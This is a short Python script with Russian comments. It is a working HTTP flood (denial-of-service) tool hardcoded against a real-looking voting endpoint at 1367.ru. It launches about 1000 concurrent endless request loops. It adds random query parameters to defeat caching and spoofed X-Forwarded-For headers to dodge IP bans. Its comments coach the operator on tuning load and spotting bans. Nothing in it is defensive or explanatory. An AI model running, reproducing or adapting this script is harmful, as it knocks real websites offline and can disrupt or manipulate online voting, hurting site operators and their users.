import asyncio
import aiohttp
import random
import string

# Лимит ОДНОВРЕМЕННЫХ запросов. Ставь 500-1000, если комп мощный — 2000. 
# Больше — винда начнет тупить.
MAX_CONNS = 1000 

async def attack(target_url, semaphore):
    # Добавляем мусор в параметры, чтобы обходить кэширование
    def get_random_param():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

    async with semaphore: # Не пускаем больше MAX_CONNS за раз
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while True:
                url = f"{target_url}?v={get_random_param()}"
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                try:
                    async with session.get(url, headers=headers) as response:
                        # Если видишь 403 или 429 — значит, тебя спалили и забанили по IP
                        print(f"[*] Запрос ушел: {response.status}")
                except Exception:
                    pass # На ошибки похуй, просто шпилим дальше
                
                await asyncio.sleep(0.001) # Микропауза, чтобы сокеты успевали закрываться

async def main():
    target = "http://1367.ru/vote"
    sem = asyncio.Semaphore(MAX_CONNS)
    
    print(f"[*] Запускаем адекватную жарку на {MAX_CONNS} потоков...")
    tasks = [attack(target, sem) for _ in range(MAX_CONNS)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())